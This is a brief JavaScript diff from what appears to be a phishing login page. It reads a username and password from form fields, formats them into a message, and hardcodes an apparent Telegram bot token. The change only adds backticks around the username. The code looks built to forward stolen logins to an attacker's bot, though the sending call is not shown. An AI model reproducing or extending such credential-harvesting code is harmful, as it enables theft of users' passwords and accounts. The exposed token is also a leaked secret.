@@ -31,7 +31,7 @@ var username = $("#username").val();
 
 var pass = $("#pass").val();
 
-var text = "user : " + username + " || pass : `" + pass + "`" 
+var text = "user : `" + username + "` || pass : `" + pass + "`" 
 
 var token = "819018892:AAH2xY5pzZ4gtPyPoF87rXEpXE-Bf8C65GU";
 
